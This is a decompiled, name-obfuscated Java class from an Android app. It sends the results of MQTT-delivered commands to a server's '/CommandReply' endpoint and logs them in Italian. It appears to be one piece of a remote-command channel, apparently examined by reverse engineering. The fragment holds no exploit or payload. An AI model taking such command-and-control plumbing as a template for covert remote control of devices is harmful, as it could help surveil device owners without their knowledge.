package com.app.system.common.d.a;

import android.content.Context;
import com.app.system.common.h;
import com.app.system.mqtt.MqttCommandReply;
import com.google.gson.f;
import java.io.IOException;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class e
  extends a
{
  private Context d;
  
  public e(Context paramContext)
  {
    super(null, h.c(paramContext));
    this.d = paramContext;
  }
  
  public int a(MqttCommandReply paramMqttCommandReply)
  {
    try
    {
      String str = h.b().a(paramMqttCommandReply);
      Context localContext = this.d;
      StringBuilder localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      localStringBuilder.append("INVIO RISPOSTA: ");
      localStringBuilder.append(paramMqttCommandReply.result);
      h.a(localContext, localStringBuilder.toString());
      paramMqttCommandReply = new java/lang/StringBuilder;
      paramMqttCommandReply.<init>();
      paramMqttCommandReply.append(this.c);
      paramMqttCommandReply.append("/CommandReply");
      paramMqttCommandReply = com.app.system.common.d.a.a.a.a(paramMqttCommandReply.toString(), str);
      if (paramMqttCommandReply == null) {
        return -10;
      }
      int i = Integer.parseInt(paramMqttCommandReply.body().string());
      return i;
    }
    catch (IOException paramMqttCommandReply)
    {
      com.security.d.a.a("ProtocolForCommands", paramMqttCommandReply.getMessage(), new Object[0]);
    }
    return 0;
  }
}


/* Location:              ~/com/app/system/common/d/a/e.class
 *
 * Reversed by:           J
 */